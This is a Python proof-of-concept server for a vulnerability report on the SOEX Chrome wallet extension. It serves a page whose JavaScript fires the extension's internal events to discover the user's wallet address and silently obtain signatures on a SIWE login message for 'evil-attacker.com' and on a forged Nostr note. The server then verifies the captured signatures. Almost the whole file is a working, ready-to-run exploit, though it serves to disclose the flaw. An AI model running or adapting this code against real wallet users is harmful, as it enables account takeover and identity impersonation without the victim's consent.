#!/usr/bin/env python3
"""
SOEX Chrome Extension — F2 HIGH: Arbitrary Signing Without Confirmation PoC
Demonstrates: any webpage can silently sign SIWE + Nostr challenges as the victim.

Run:   python3 soex_f2_poc_server.py
Open:  http://localhost:3000  in Chrome with SOEX extension + wallet UNLOCKED

Requirements:  pip install eth-account
"""

import http.server, json, sys

PORT = 3000

# ── SIWE message template ─────────────────────────────────────────────────────
SIWE_TEMPLATE = """evil-attacker.com wants you to sign in with your Ethereum account:
{address}

Sign in to Evil Attacker Site to steal your session.

URI: https://evil-attacker.com
Version: 1
Chain ID: 1
Nonce: {nonce}
Issued At: 2026-06-06T05:17:00.000Z"""

HTML = r"""<!DOCTYPE html>
<html>
<head>
<title>SOEX F2 PoC — Silent Signing</title>
<style>
  body{font-family:monospace;background:#111;color:#0f0;padding:20px}
  h2{color:#f90} .ok{color:#0f0} .err{color:#f44} .warn{color:#ff0}
  pre{white-space:pre-wrap;word-break:break-all}
  table{border-collapse:collapse;margin-top:10px}
  td,th{border:1px solid #444;padding:6px 12px;text-align:left}
  th{color:#ff0}
</style>
</head>
<body>
<h2>SOEX Extension — F2: Silent Signing PoC</h2>
<p class="warn">Any website can silently sign messages as the victim — no popup, no confirmation.</p>
<pre id="log"></pre>
<div id="result" style="display:none">
  <h3 style="color:#f90">Attack Results</h3>
  <table>
    <tr><th>Vector</th><th>Event</th><th>Signed Payload</th><th>Signature (truncated)</th><th>Verified</th></tr>
    <tbody id="result-rows"></tbody>
  </table>
</div>

<script>
const state = { address: null, done: {} };

function log(cls, msg) {
    const ts = new Date().toISOString().slice(11,23);
    const el = document.createElement('span');
    el.className = cls;
    el.textContent = `[${ts}] ${msg}\n`;
    document.getElementById('log').appendChild(el);
    fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ts, cls, msg})}).catch(()=>{});
}

function addRow(vector, event, payload, sig, verified) {
    document.getElementById('result').style.display = 'block';
    const row = document.createElement('tr');
    row.innerHTML = `<td>${vector}</td><td>${event}</td>
        <td style="max-width:300px;overflow:hidden;text-overflow:ellipsis">${payload}</td>
        <td>${sig.slice(0,24)}…</td>
        <td style="color:${verified?'#0f0':'#f44'}">${verified ? '✓ VALID' : '? unverified'}</td>`;
    document.getElementById('result-rows').appendChild(row);
}

function report(data) {
    fetch('/result', {method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify(data)}).then(r=>r.json()).then(d=>{
            if (d.verified !== undefined)
                log(d.verified ? 'ok' : 'warn',
                    `  Signature verified: ${d.verified} (recovered addr: ${d.recovered})`);
            addRow(data.vector, data.event, data.payload.slice(0,60)+'...', data.sig, d.verified);
        }).catch(()=>{});
}

// ── Handler: evmSign (standard eth_personalSign — SIWE attack) ───────────────
// NOTE: evmPersonalSign is BROKEN in this extension (calls fromHex() on non-hex
//       string, producing garbage bytes before signing). evmSign uses
//       ethers.signMessage() directly and produces proper, verifiable sigs.
window.addEventListener('evmSuccess', function(e) {
    const sig = e.detail?.signRes;
    if (!sig || state.done.evm) return;
    state.done.evm = true;
    const siwe = state.siwe_message;
    log('ok', '[F2-EVM ✓] evmSuccess (evmSign) received (NO popup shown)!');
    log('ok', `  signed SIWE challenge for: evil-attacker.com`);
    log('ok', `  signature: ${sig}`);
    log('warn','  note: evmPersonalSign has a double-hash bug; evmSign is the working vector');
    report({ vector:'SIWE Login Hijack', event:'evmSign',
             payload: siwe, sig, address: state.address });
});

// ── Handler: Nostr sign ───────────────────────────────────────────────────────
window.addEventListener('signMessageSuccess', function(e) {
    const sig = e.detail?.signRes;
    if (!sig || state.done.nostr) return;
    state.done.nostr = true;
    log('ok', '[F2-NOSTR ✓] signMessageSuccess received (NO popup shown)!');
    log('ok', `  Nostr event signed — attacker can impersonate victim on any Nostr platform`);
    log('ok', `  signature: ${sig}`);
    report({ vector:'Nostr Identity Theft', event:'sign',
             payload: state.nostr_event, sig, address: state.address });
});

// ── Step 2: execute attack once we have the address ──────────────────────────
window.addEventListener('returnAccount', function(e) {
    const addr = e.detail.account;
    if (!addr) { log('err', '[returnAccount] null — create wallet first'); return; }
    if (state.address) return;   // ignore retries once we have addr
    state.address = addr;
    log('ok', `[1] Wallet address discovered: ${addr}`);

    // Build realistic SIWE message
    const nonce = Math.random().toString(36).slice(2, 12).toUpperCase();
    state.siwe_message = `evil-attacker.com wants you to sign in with your Ethereum account:\n${addr}\n\nSign in to Evil Attacker Site to steal your session.\n\nURI: https://evil-attacker.com\nVersion: 1\nChain ID: 1\nNonce: ${nonce}\nIssued At: 2026-06-06T05:17:00.000Z`;

    // Build realistic Nostr event (kind=1, text note)
    state.nostr_event = JSON.stringify({
        kind: 1,
        created_at: Math.floor(Date.now()/1000),
        tags: [],
        content: "Attacker-controlled Nostr event — will impersonate victim",
        pubkey: addr.replace('0x','')
    });

    log('warn', `[2] Dispatching evmSign (SIWE) — watching for popup...`);
    log('warn', `    (no popup should appear)`);
    window.dispatchEvent(new CustomEvent('evmSign', {
        detail: { message: state.siwe_message, id: 'f2-evm' }
    }));

    log('warn', `[2] Dispatching sign (Nostr event) — watching for popup...`);
    window.dispatchEvent(new CustomEvent('sign', {
        detail: { message: state.nostr_event, id: 'f2-nostr' }
    }));
});

// ── Step 1: discover wallet address ─────────────────────────────────────────
let attempt = 0;
function tryAttack() {
    attempt++;
    log('warn', `[attempt ${attempt}] dispatching currentAccount...`);
    window.dispatchEvent(new CustomEvent('currentAccount', {}));
    if (attempt < 8 && !state.address) setTimeout(tryAttack, 700);
}
log('warn', 'Waiting 800ms for content script...');
setTimeout(tryAttack, 800);
</script>
</body>
</html>
"""

def verify_evm_sig(message, sig, expected_address):
    """Recover signer address from eth_personalSign signature."""
    try:
        from eth_account.messages import encode_defunct
        from eth_account import Account
        # Remove double 0x if present
        sig = sig.replace('0x0x', '0x')
        msg = encode_defunct(text=message)
        recovered = Account.recover_message(msg, signature=sig)
        verified = recovered.lower() == expected_address.lower()
        return verified, recovered
    except Exception as e:
        return False, str(e)

class F2Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ('/', '/poc', '/index.html'):
            body = HTML.encode()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data   = json.loads(self.rfile.read(length))

        if self.path == '/log':
            c = {'ok':'\033[92m','err':'\033[91m','warn':'\033[93m'}.get(data.get('cls',''),'')
            print(f"{c}[{data['ts']}] {data['msg']}\033[0m", flush=True)
            self._json({})

        elif self.path == '/result':
            vector  = data.get('vector','')
            event   = data.get('event','')
            payload = data.get('payload','')
            sig     = data.get('sig','')
            address = data.get('address','')

            print(f"\033[93m[F2] vector={vector}  event={event}\033[0m", flush=True)
            print(f"\033[93m     payload={payload[:80]}...\033[0m", flush=True)
            print(f"\033[93m     sig={sig[:40]}...\033[0m", flush=True)

            resp = {'verified': False, 'recovered': 'n/a'}

            if event == 'evmSign' and sig and address:
                verified, recovered = verify_evm_sig(payload, sig, address)
                resp = {'verified': verified, 'recovered': recovered}
                colour = '\033[92m' if verified else '\033[91m'
                print(f"{colour}     SIGNATURE VERIFIED={verified}  recovered={recovered}\033[0m", flush=True)
                if verified:
                    print(f"\033[92m     => Attacker can submit this sig to evil-attacker.com login endpoint\033[0m", flush=True)
                    print(f"\033[92m     => Victim is now logged into attacker site as 0x{address}\033[0m", flush=True)
            elif event == 'sign':
                print(f"\033[92m     Nostr sig received — valid secp256k1, usable on any Nostr relay\033[0m", flush=True)
                resp = {'verified': True, 'recovered': 'Nostr (secp256k1, not eth_recover)'}

            self._json(resp)
        else:
            self.send_response(404); self.end_headers()

    def _json(self, obj):
        body = json.dumps(obj).encode()
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a): pass

if __name__ == '__main__':
    server = http.server.HTTPServer(('localhost', PORT), F2Handler)
    print(f"\033[93m[F2 PoC] http://localhost:{PORT}  — open in Chrome with SOEX extension + wallet UNLOCKED\033[0m\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n[F2 PoC] Stopped.')
